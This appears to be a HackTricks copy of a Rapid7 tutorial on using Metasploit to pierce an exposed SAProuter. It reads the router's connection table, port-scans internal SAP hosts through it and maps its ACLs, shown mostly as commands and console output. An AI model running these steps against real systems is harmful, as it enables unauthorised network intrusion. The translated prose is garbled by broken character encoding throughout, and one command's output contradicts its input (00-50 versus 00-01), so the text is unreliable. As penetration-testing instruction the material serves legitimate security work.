<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚

- [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚

- [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricksãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)**ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>


Copy of: [https://blog.rapid7.com/2014/01/09/piercing-saprouter-with-metasploit/](https://blog.rapid7.com/2014/01/09/piercing-saprouter-with-metasploit/)
```text
PORT     STATE SERVICE    VERSION
3299/tcp open  saprouter?
```
# Metasploitã‚’ä½¿ç”¨ã—ã¦SAProuterã‚’çªç ´ã™ã‚‹

Saprouterã¯åŸºæœ¬çš„ã«SAPã‚·ã‚¹ãƒ†ãƒ ç”¨ã®ãƒªãƒãƒ¼ã‚¹ãƒ—ãƒ­ã‚­ã‚·ã§ã‚ã‚Šã€é€šå¸¸ã¯ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã¨å†…éƒ¨ã®SAPã‚·ã‚¹ãƒ†ãƒ ã®é–“ã«é…ç½®ã•ã‚Œã¾ã™ã€‚ãã®ä¸»ãªç›®çš„ã¯ã€é€šå¸¸ã®ãƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«ã‚ˆã‚Šã‚‚SAPãƒ—ãƒ­ãƒˆã‚³ãƒ«ã®ç´°ã‹ã„åˆ¶å¾¡ã‚’å¯èƒ½ã«ã™ã‚‹ãŸã‚ã€ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆä¸Šã®ãƒ›ã‚¹ãƒˆã‹ã‚‰å†…éƒ¨ã®SAPã‚·ã‚¹ãƒ†ãƒ ã¸ã®åˆ¶å¾¡ã•ã‚ŒãŸã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯ã™ã‚‹ã“ã¨ã§ã™ã€‚

ã“ã‚Œã¯ã€saprouterãŒçµ„ç¹”ã®ãƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«ã§saprouterãƒ›ã‚¹ãƒˆã¸ã®ã‚¤ãƒ³ãƒã‚¦ãƒ³ãƒ‰TCPãƒãƒ¼ãƒˆ3299ã‚’è¨±å¯ã™ã‚‹ã“ã¨ã§ã€é€šå¸¸ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã«å…¬é–‹ã•ã‚Œã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚ãã—ã¦ã€saprouterã‹ã‚‰ã¯å°‘ãªãã¨ã‚‚å†…éƒ¨ã®SAPã‚µãƒ¼ãƒãƒ¼ã«åˆ°é”ã§ãã‚‹ã¯ãšã§ã™ã€‚ã“ã‚Œã¯éå¸¸ã«èˆˆå‘³æ·±ã„ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã§ã‚ã‚Šã€"é«˜ã„ä¾¡å€¤"ã®ã‚ã‚‹ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã¸ã®é€²å…¥çµŒè·¯ã‚’æä¾›ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

ä»¥ä¸‹ã®å›³ã¯ã€ä¾‹ã¨ã—ã¦ä½¿ç”¨ã™ã‚‹åŸºæœ¬çš„ãªãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯æ§‹æˆã‚’ç¤ºã—ã¦ã„ã¾ã™ï¼š

![](https://blog.rapid7.com/content/images/post-images/33923/image1.jpg)

ã¾ãšã€[`sap_service_discovery`](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_service_discovery)ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã€å…¬é–‹ã•ã‚ŒãŸIPã‚¢ãƒ‰ãƒ¬ã‚¹ï¼ˆã“ã®å ´åˆã¯1.2.3.101ï¼‰ã®SAPã‚µãƒ¼ãƒ“ã‚¹ã‚¹ã‚­ãƒ£ãƒ³ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚
```text
msf> use auxiliary/scanner/sap/sap_service_discovery
msf auxiliary(sap_service_discovery) > set RHOSTS 1.2.3.101
RHOSTS => 1.2.3.101
msf auxiliary(sap_service_discovery) > run

[*] [SAP] Beginning service Discovery '1.2.3.101'

[+] 1.2.3.101:3299      - SAP Router OPEN
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
ã‚¹ã‚­ãƒ£ãƒ³çµæœã«ã‚ˆã‚‹ã¨ã€ãƒ›ã‚¹ãƒˆã¯äºˆæƒ³ã•ã‚Œã‚‹TCPãƒãƒ¼ãƒˆ3299ã§SAPãƒ«ãƒ¼ã‚¿ã‚’å®Ÿè¡Œã—ã¦ã„ã¾ã™ã€‚ã“ã‚Œã§ã•ã‚‰ã«è©³ã—ãèª¿æŸ»ã—ã€saprouterã‹ã‚‰æƒ…å ±ã‚’å–å¾—ã—ã‚ˆã†ã¨è©¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚è¨­å®šãŒèª¤ã£ã¦ã„ã‚‹å ´åˆã€ãã—ã¦ã—ã°ã—ã°ãã†ã§ã™ãŒã€saprouterã‚’ä»‹ã—ã¦å†…éƒ¨ãƒ›ã‚¹ãƒˆã¸ã®æ¥ç¶šãªã©ã€å†…éƒ¨æƒ…å ±ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ã“ã®ç›®çš„ã®ãŸã‚ã«ã€[`sap_router_info_request`](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_router_info_request)ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚
```text
msf auxiliary(sap_router_info_request) > use auxiliary/scanner/sap/sap_router_info_request
msf auxiliary(sap_router_info_request) > set RHOSTS 1.2.3.101
RHOSTS => 1.2.3.101
msf auxiliary(sap_router_info_request) > run

[+] 1.2.3.101:3299 - Connected to saprouter
[+] 1.2.3.101:3299 - Sending ROUTER_ADM packet info request
[+] 1.2.3.101:3299 - Got INFO response
[+] Working directory   : /opt/sap
[+] Routtab             : ./saprouttab

[SAP] SAProuter Connection Table for 1.2.3.101
===================================================

Source        Destination   Service
------        -----------   -------
1.2.3.12      192.168.1.18  3200


[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
ã—ãŸãŒã£ã¦ã€å‡ºåŠ›ã‹ã‚‰ã‚ã‹ã‚‹ã‚ˆã†ã«ã€ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆä¸Šã®èª°ã‹ï¼ˆ1.2.3.12ï¼‰ãŒå†…éƒ¨ãƒ›ã‚¹ãƒˆï¼ˆ192.168.1.18ï¼‰ã®ãƒãƒ¼ãƒˆ3200ã«æ¥ç¶šã—ã¦ã„ã¾ã™ã€‚ãƒãƒ¼ãƒˆ3200ã¯ã€DIAGãƒ—ãƒ­ãƒˆã‚³ãƒ«ã®ä¸€èˆ¬çš„ãªSAPãƒãƒ¼ãƒˆã§ã™ï¼ˆã“ã‚Œã¯SAP GUIã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒSAPã‚µãƒ¼ãƒãƒ¼ã«æ¥ç¶šã™ã‚‹å ´æ‰€ã§ã™ï¼‰ã€‚ã¾ãŸã€å†…éƒ¨IPã‚¢ãƒ‰ãƒ¬ã‚¹ã‚¹ã‚­ãƒ¼ãƒ ã«é–¢ã™ã‚‹æƒ…å ±ã‚‚å–å¾—ã—ã¦ãŠã‚Šã€ãŠãã‚‰ã192.168.1.0/24ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã¾ãŸã¯ãã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯å†…ã®ã„ãã¤ã‹ã®ã‚µãƒ–ãƒãƒƒãƒˆã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ã“ã¨ãŒã»ã¼ç¢ºå®Ÿã§ã™ã€‚

**å†…éƒ¨ãƒ›ã‚¹ãƒˆã¨ã‚µãƒ¼ãƒ“ã‚¹ã®åˆ—æŒ™**

ã“ã®æƒ…å ±ã‚’å…ƒã«ã€å†…éƒ¨ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã®ã‚¹ã‚­ãƒ£ãƒ³ã‚’é–‹å§‹ã§ãã¾ã™ã€‚saprouterã¯ãƒ—ãƒ­ã‚­ã‚·ã®ã‚ˆã†ã«æ©Ÿèƒ½ã™ã‚‹ãŸã‚ã€ãã‚Œã«æ¥ç¶šã—ã¦å†…éƒ¨ãƒ›ã‚¹ãƒˆã¨ãƒãƒ¼ãƒˆã¸ã®æ¥ç¶šã‚’è¦æ±‚ã—ã€saprouterã‹ã‚‰ã®å¿œç­”ã‚’ç¢ºèªã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€saprouterã®è¨­å®šã«å¿œã˜ã¦ã€å†…éƒ¨ãƒ›ã‚¹ãƒˆã€ã‚µãƒ¼ãƒ“ã‚¹ã€ãŠã‚ˆã³ACLã«é–¢ã™ã‚‹ã•ã‚‰ãªã‚‹æ´å¯ŸãŒå¾—ã‚‰ã‚Œã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚ã“ã®ç›®çš„ã®ãŸã‚ã«ã€[`sap_router_portscanner`](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_router_portscanner)ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

ã“ã®ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã¯saprouterã«æ¥ç¶šã—ã€æŒ‡å®šã—ãŸTCPãƒãƒ¼ãƒˆã§ä»–ã®ãƒ›ã‚¹ãƒˆï¼ˆTARGETSã‚ªãƒ—ã‚·ãƒ§ãƒ³ã§å®šç¾©ï¼‰ã¸ã®æ¥ç¶šã‚’è¦æ±‚ã—ã¾ã™ã€‚ãã®å¾Œã€å¿œç­”ã‚’åˆ†æã—ã€è¦æ±‚ã•ã‚ŒãŸæ¥ç¶šãŒå¯èƒ½ã‹ã©ã†ã‹ã‚’åˆ¤æ–­ã—ã¾ã™ã€‚ã“ã®ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã«ã¯ã„ãã¤ã‹ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ãŒã‚ã‚Šã¾ã™ã€‚
```text
Basic options:
Name         Current Setting  Required  Description
----         ---------------  --------  -----------
CONCURRENCY  10               yes       The number of concurrent ports to check per host
INSTANCES    00-99            no        SAP instance numbers to scan (NN in PORTS definition)
MODE         SAP_PROTO        yes       Connection Mode: SAP_PROTO or TCP  (accepted: SAP_PROTO, TCP)
PORTS        32NN             yes       Ports to scan (e.g. 3200-3299,5NN13)
RESOLVE      local            yes       Where to resolve TARGETS (accepted: remote, local)
RHOST                         yes       SAPRouter address
RPORT        3299             yes       SAPRouter TCP port
TARGETS                       yes       Comma delimited targets. When resolution is local address ranges or CIDR identifiers allowed.
```
å°‘ãªãã¨ã‚‚ã€saprouterã®IPã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’è¨­å®šã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ä¾‹ãˆã°ã€1.2.3.101ã§ã™ã€‚æ¬¡ã«ã€ã‚¹ã‚­ãƒ£ãƒ³ã—ãŸã„å†…éƒ¨ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’TARGETSã«è¨­å®šã—ã€æœ€å¾Œã«ã‚¹ã‚­ãƒ£ãƒ³ã™ã‚‹TCPãƒãƒ¼ãƒˆã‚’PORTSã«è¨­å®šã—ã¾ã™ã€‚

ã“ã®ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã«ã¯ã€PORTSã‚ªãƒ—ã‚·ãƒ§ãƒ³ã®å®šç¾©ã‚’ç°¡ç´ åŒ–ã™ã‚‹INSTANCESã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚‚ã‚ã‚Šã¾ã™ã€‚SAPã®ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã§ã¯ã€è¤‡æ•°ã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ãŒã‚µãƒãƒ¼ãƒˆã•ã‚Œã¦ãŠã‚Šã€åŒæ§˜ã®ã‚µãƒ¼ãƒ“ã‚¹ãŒæä¾›ã•ã‚Œã¦ã„ã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€å„ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«ã¯å‰²ã‚Šå½“ã¦ã‚‰ã‚ŒãŸTCPãƒãƒ¼ãƒˆãŒã‚ã‚Šã¾ã™ã€‚ä¾‹ãˆã°ã€SAPã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹00ã¯ãƒãƒ¼ãƒˆ3200ã§SAPãƒ‡ã‚£ã‚¹ãƒ‘ãƒƒãƒãƒ£ãƒ¼ã‚µãƒ¼ãƒ“ã‚¹ï¼ˆSAP GUIãŒæ¥ç¶šã™ã‚‹ã‚µãƒ¼ãƒ“ã‚¹ï¼‰ã‚’æŒã¡ã€ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹01ã¯ãƒãƒ¼ãƒˆ3201ã§æä¾›ã•ã‚Œã¾ã™ã€‚PORTSã‚ªãƒ—ã‚·ãƒ§ãƒ³ã¯ã€Œãƒ¯ã‚¤ãƒ«ãƒ‰ã‚«ãƒ¼ãƒ‰ã€ã¨ã—ã¦ã€ŒNNã€ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ãŠã‚Šã€ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ç•ªå·ã§ç½®ãæ›ãˆã‚‰ã‚Œã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€00ã‹ã‚‰50ã¾ã§ã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚’ã‚¹ã‚­ãƒ£ãƒ³ã—ãŸã„å ´åˆã€ä»¥ä¸‹ã®ã‚ˆã†ã«INSTANCESã¨PORTSå¤‰æ•°ã‚’å®šç¾©ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```text
msf auxiliary(sap_router_portscanner) > set INSTANCES 00-50
INSTANCES => 00-01
msf auxiliary(sap_router_portscanner) > set PORTS 32NN
PORTS => 32NN
```
ã“ã®è¨­å®šã§ã¯ã€ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã¯ãƒãƒ¼ãƒˆ3200ã‹ã‚‰3250ã®ç¯„å›²ã§ã‚¹ã‚­ãƒ£ãƒ³ã‚’è¡Œã„ã¾ã™ã€‚

ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã®ã‚½ãƒ¼ã‚¹ã«ã¯ã€SAPã‚·ã‚¹ãƒ†ãƒ ã®ä¸€èˆ¬çš„ãªãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒãƒ¼ãƒˆã«é–¢ã™ã‚‹æƒ…å ±ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã‚’ã‚¹ã‚­ãƒ£ãƒ³ã«ä½¿ç”¨ã—ã¾ã™ã€‚
```text
msf > use auxiliary/scanner/sap/sap_router_portscanner
msf auxiliary(sap_router_portscanner) > use auxiliary/scanner/sap/sap_router_portscanner
msf auxiliary(sap_router_portscanner) > set RHOST 1.2.3.101
RHOST => 1.2.3.101
msf auxiliary(sap_router_portscanner) > set TARGETS 192.168.1.18
TARGETS => 192.168.1.18
msf auxiliary(sap_router_portscanner) > set INSTANCES 00-01
INSTANCES => 00-01
msf auxiliary(sap_router_portscanner) > set PORTS 32NN,33NN,48NN,80NN,36NN,81NN,5NN00-5NN19,21212,21213,59975,59976,4238-4241,3299,3298,515,7200,7210,7269,7270,7575,39NN,3909,4NN00,8200,8210,8220,8230,4363,4444,4445,9999,3NN01-3NN08,3NN11,3NN17,20003-20007,31596,31597,31602,31601,31604,2000-2002,8355,8357,8351-8353,8366,1090,1095,20201,1099,1089,443NN,444NN
PORTS => 32NN,33NN,48NN,80NN,36NN,81NN,5NN00-5NN19,21212,21213,59975,59976,4238-4241,3299,3298,515,7200,7210,7269,7270,7575,39NN,3909,4NN00,8200,8210,8220,8230,4363,4444,4445,9999,3NN01-3NN08,3NN11,3NN17,20003-20007,31596,31597,31602,31601,31604,2000-2002,8355,8357,8351-8353,8366,1090,1095,20201,1099,1089,443NN,444NN
msf auxiliary(sap_router_portscanner) > run

[*] Scanning 192.168.1.18
[!] Warning: Service info could be inaccurate

Portscan Results
================

Host           Port   State   Info
----           ----   -----   ----
192.168.1.18   3201   closed  SAP Dispatcher sapdp01
192.168.1.18   3200   open    SAP Dispatcher sapdp00
192.168.1.18   50013  open    SAP StartService [SOAP] sapctrl00

[*] Auxiliary module execution completed
```
ç§ãŸã¡ã¯ã€saprouterã‚’ä»‹ã—ã¦ä¸€éƒ¨ã®æ¥ç¶šãŒè¨±å¯ã•ã‚Œãªã„ç†ç”±ã‚’ç†è§£ã™ã‚‹ãŸã‚ã«ã€VERBOSEã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚VERBOSEãŒtrueã«è¨­å®šã•ã‚Œã¦ã„ã‚‹å ´åˆã€saprouterã‹ã‚‰ã®å¿œç­”ã‚’è¦‹ã‚‹ã“ã¨ãŒã§ãã€å®šç¾©ã•ã‚ŒãŸACLã‚’ãƒãƒƒãƒ”ãƒ³ã‚°ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ä»Šå›ã¯ã€ãƒãƒ¼ãƒˆ3200ã§ã®ã¿ã€192.168.1.18ã¨192.168.1.1ã®ãƒ›ã‚¹ãƒˆã‚’ã‚¹ã‚­ãƒ£ãƒ³ã—ã¦ã€ä¸¡æ–¹ã®SAPãƒ‡ã‚£ã‚¹ãƒ‘ãƒƒãƒãƒ£ãƒ¼ã«æ¥ç¶šã§ãã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã¾ã™ã€‚
```text
msf auxiliary(sap_router_portscanner) > set VERBOSE true
VERBOSE => true
msf auxiliary(sap_router_portscanner) > set TARGETS 192.168.1.1,192.168.1.18
TARGETS => 192.168.1.1,192.168.1.18
msf auxiliary(sap_router_portscanner) > set PORTS 32NN
PORTS => 32NN
msf auxiliary(sap_router_portscanner) > run

[*] Scanning 192.168.1.18
[+] 192.168.1.18:3200 - TCP OPEN
[!] Warning: Service info could be inaccurate

Portscan Results
================

Host          Port  State   Info
----          ----  -----   ----
192.168.1.18  3200  open  SAP Dispatcher sapdp00

[*] Scanning 192.168.1.1
[-] 192.168.1.1:3200 - blocked by ACL
[!] Warning: Service info could be inaccurate
[*] Auxiliary module execution completed
```
**ACLã®ãƒãƒƒãƒ”ãƒ³ã‚°**

saprouterã«ã¤ã„ã¦èˆˆå‘³æ·±ã„ã“ã¨ã¯ã€2ç¨®é¡ã®æ¥ç¶šã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã‚‹ã“ã¨ã§ã™ã€‚

- ãƒã‚¤ãƒ†ã‚£ãƒ– - ã“ã‚Œã‚‰ã®æ¥ç¶šã¯å˜ç´”ãªTCPæ¥ç¶šã§ã™ã€‚
- SAPãƒ—ãƒ­ãƒˆã‚³ãƒ« - ã“ã‚Œã‚‰ã¯TCPæ¥ç¶šã§ã€ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã§ã¯ã™ã¹ã¦ã®ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãŒå¾Œç¶šã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã®é•·ã•ã‚’ç¤ºã™4ãƒã‚¤ãƒˆã§å§‹ã¾ã‚‹ã¨è¦å®šã•ã‚Œã¦ã„ã¾ã™ã€‚

SAPãƒ—ãƒ­ãƒˆã‚³ãƒ«ã¯saprouterå›ºæœ‰ã®ã‚‚ã®ã§ã‚ã‚Šã€SAP GUIãŒsaprouterã‚’ä»‹ã—ã¦SAP DIAGãƒãƒ¼ãƒˆã«æ¥ç¶šã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã—ã¾ã™ã€‚ãƒã‚¤ãƒ†ã‚£ãƒ–ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã¯ã€ä»–ã®ã‚¿ã‚¤ãƒ—ã®æ¥ç¶šã‚’saprouterã‚’é€šã˜ã¦è¨±å¯ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

ã“ã®ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã§ã¯ã€ã‚¹ã‚­ãƒ£ãƒ³ä¸­ã«ãƒ†ã‚¹ãƒˆã™ã‚‹æ¥ç¶šã®ã‚¿ã‚¤ãƒ—ã‚’MODEã‚ªãƒ—ã‚·ãƒ§ãƒ³ã§æŒ‡å®šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã¯SAPãƒ—ãƒ­ãƒˆã‚³ãƒ«ã§ã‚ã‚Šã€ã“ã‚ŒãŒæœ€ã‚‚ä¸€èˆ¬çš„ã«ä½¿ç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ãŸã ã—ã€saprouterã‚’ä»‹ã—ã¦ä»–ã®ã‚µãƒ¼ãƒ“ã‚¹ãŒè¨±å¯ã•ã‚Œã¦ã„ã‚‹å ´åˆã€ACLã¯ãƒã‚¤ãƒ†ã‚£ãƒ–ï¼ˆTCPï¼‰æ¥ç¶šã‚’è¨±å¯ã™ã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚

æ¥ç¶šã®ã‚¿ã‚¤ãƒ—ã‚’è¨±å¯ã™ã‚‹ãŸã‚ã«MODEã‚’TCPã«è¨­å®šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä»Šå›ã¯ã€å†…éƒ¨ãƒ›ã‚¹ãƒˆã‚’ã‚¹ã‚­ãƒ£ãƒ³ã—ã€ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹00ã¨01ã®ä¸¡æ–¹ã§ãƒãƒ¼ãƒˆ3200ï¼ˆSAP DIAGï¼‰ã¨80ï¼ˆHTTPï¼‰ã®ä¸¡æ–¹ã§VERBOSEã‚’trueã«è¨­å®šã—ã¦ã€ä½•ãŒèµ·ã“ã‚‹ã‹ã‚’ç¢ºèªã—ã¾ã™ã€‚
```text
msf auxiliary(sap_router_portscanner) > set MODE TCP
MODE => TCP

msf auxiliary(sap_router_portscanner) > set PORTS 80,32NN
PORTS => 80,32NN
msf auxiliary(sap_router_portscanner) > set INSTANCES 00-01
INSTANCES => 00-01
msf auxiliary(sap_router_portscanner) > run

[*] Scanning 192.168.1.18
[+] 192.168.1.18:80 - TCP OPEN
[-] 192.168.1.18:3200 - blocked by ACL
[+] 192.168.1.18:3201 - TCP OPEN
[!] Warning: Service info could be inaccurate

Portscan Results
================

Host          Port  State  Info
----          ----  -----  ----
192.168.1.18  80    open
192.168.1.18  3201  open   SAP Dispatcher sapdp01

[*] Scanning 192.168.1.1
[-] 192.168.1.1:3200 - blocked by ACL
[+] 192.168.1.1:3201 - TCP OPEN
[+] 192.168.1.1:80 - TCP OPEN
[!] Warning: Service info could be inaccurate

Portscan Results
================

Host         Port  State  Info
----         ----  -----  ----
192.168.1.1  3201  open   SAP Dispatcher sapdp01
192.168.1.1  80    open

[*] Auxiliary module execution completed
```
From the output and the previous information we now know that the ACL is something like this:

* ä»»æ„ã®ãƒ›ã‚¹ãƒˆã‹ã‚‰192.168.1.1ã¸ã®ãƒãƒ¼ãƒˆ80ã¸ã®TCPæ¥ç¶šã‚’è¨±å¯ã—ã¾ã™ã€‚
* ä»»æ„ã®ãƒ›ã‚¹ãƒˆã‹ã‚‰192.168.1.18ã¸ã®ãƒãƒ¼ãƒˆ80ã¸ã®TCPæ¥ç¶šã‚’è¨±å¯ã—ã¾ã™ã€‚
* ä»»æ„ã®ãƒ›ã‚¹ãƒˆã‹ã‚‰192.168.1.1ã¸ã®ãƒãƒ¼ãƒˆ3201ã¸ã®TCPæ¥ç¶šã‚’è¨±å¯ã—ã¾ã™ã€‚
* ä»»æ„ã®ãƒ›ã‚¹ãƒˆã‹ã‚‰192.168.1.18ã¸ã®ãƒãƒ¼ãƒˆ3201ã¸ã®TCPæ¥ç¶šã‚’è¨±å¯ã—ã¾ã™ã€‚
* ä»»æ„ã®ãƒ›ã‚¹ãƒˆã‹ã‚‰192.168.1.18ã¸ã®ãƒãƒ¼ãƒˆ3200ã¸ã®SAPæ¥ç¶šã‚’è¨±å¯ã—ã¾ã™ã€‚

**å†…éƒ¨ãƒ›ã‚¹ãƒˆã®ç›²ç›®çš„ãªåˆ—æŒ™**

æ€ã„å‡ºã—ã¦ãã ã•ã„ã€ç§ãŸã¡ã¯saprouterã‹ã‚‰ã®æƒ…å ±ã‚’å–å¾—ã—ã¦ã€å†…éƒ¨ãƒ›ã‚¹ãƒˆã®IPã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’çŸ¥ã‚‹ã“ã¨ãŒã§ãã€ãã“ã‹ã‚‰é€²ã‚“ã§ãã¾ã—ãŸã€‚ã—ã‹ã—ã€ã‚‚ã—saprouterãŒãã®æƒ…å ±ã‚’æä¾›ã—ã¦ãã‚Œãªã‹ã£ãŸã‚‰ã©ã†ã§ã—ã‚‡ã†ã‹ï¼Ÿ

1ã¤ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã¯ã€å˜ã«ãƒ—ãƒ©ã‚¤ãƒ™ãƒ¼ãƒˆã‚¢ãƒ‰ãƒ¬ã‚¹ã‚¹ãƒšãƒ¼ã‚¹ã‚’ã‚¹ã‚­ãƒ£ãƒ³ã—ã¦ã€ä½•ãŒèµ·ã“ã‚‹ã‹ã‚’è¦‹ã‚‹ã“ã¨ã§ã™ã€‚ã‚‚ã†1ã¤ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã¯ã€ãƒ›ã‚¹ãƒˆåã«ã‚ˆã‚‹ç›²ç›®çš„ãªåˆ—æŒ™ã§ã™ã€‚

